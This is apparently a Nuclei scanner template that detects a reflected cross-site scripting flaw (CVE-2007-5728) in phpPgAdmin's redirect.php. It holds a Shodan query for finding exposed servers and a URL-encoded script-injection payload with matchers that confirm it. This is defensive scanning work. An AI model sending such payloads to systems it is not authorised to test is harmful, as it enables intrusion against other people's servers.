id: CVE-2007-5728

info:
  name: phpPgAdmin 4.1.1 - 'Redirect.php' Cross-Site Scripting
  author: dhiyaneshDK
  severity: medium
  description: Cross-site scripting (XSS) vulnerability in phpPgAdmin 3.5 to 4.1.1, and possibly 4.1.2, allows remote attackers to inject arbitrary web script or HTML via certain input available in PHP_SELF in (1) redirect.php, possibly related to (2) login.php, different vectors than CVE-2007-2865.
  tags: cve,cve2007,xss,pgadmin,phppgadmin
  reference: https://www.exploit-db.com/exploits/30090
  metadata:
    shodan-query: 'http.title:"phpPgAdmin"'

requests:
  - method: GET
    path:
      - '{{BaseURL}}/redirect.php/%22%3E%3Cscript%3Ealert(%22document.domain%22)%3C/script%3E?subject=server&server=test'

    matchers-condition: and
    matchers:

      - type: word
        words:
          - '<script>alert("document.domain")</script>'

      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "text/html"
